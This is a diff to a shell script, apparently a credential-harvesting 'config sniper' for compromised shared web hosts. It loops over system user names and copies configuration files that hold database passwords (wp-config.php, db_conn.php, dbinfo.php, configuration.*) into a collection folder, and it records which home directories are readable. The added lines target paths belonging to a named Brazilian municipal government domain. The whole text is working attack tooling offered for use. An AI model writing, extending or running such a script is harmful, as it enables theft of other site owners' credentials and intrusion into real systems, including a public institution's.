@@ -8,6 +8,9 @@ wait
 for i in $passwd
 do
 
+cp /srv/www/pmc/$i.campinas.sp.gov.br/html/ $pwd/config-sniper/$i.txt
+cp /home/$i/public_html/includes/db_conn.php $pwd/config-sniper/$i.txt
+cp /home2/$i/public_html/includes/db_conn.php $pwd/config-sniper/$i.txt
 cp /home/$i/public_html/configuration.*  $pwd/config-sniper/$i.txt
 cp /home/$i/public_html/*onfig.php  $pwd/config-sniper/$i.txt
 cp /home/$i/public_html/wp-config.php  $pwd/config-sniper/$i.txt
@@ -213,6 +216,7 @@ cp /var/www/$i/public_html/dbinfo.php $pwd/config-sniper/$i.txt
 cp /home1/$i/public_html/dbinfo.php $pwd/config-sniper/$i.txt
 ls -la /home/$i/public_html/
 
+[ -r "/srv/www/pmc/$i.campinas.sp.gov.br/html/" ] && echo "/srv/www/pmc/$i.campinas.sp.gov.br/html/sites/default/files/" >> open-dir.txt
 [ -r "/home/$i/public_html" ] && echo "/home/$i/public_html/" >> open-dir.txt
 [ -r "/var/www/$i/public_html/" ] && echo "/var/www/$i/public_html/" >> open-dir.txt
 [ -r "/home1/www/$i/public_html/" ] && echo "/home1/$i/public_html/" >> open-dir.txt
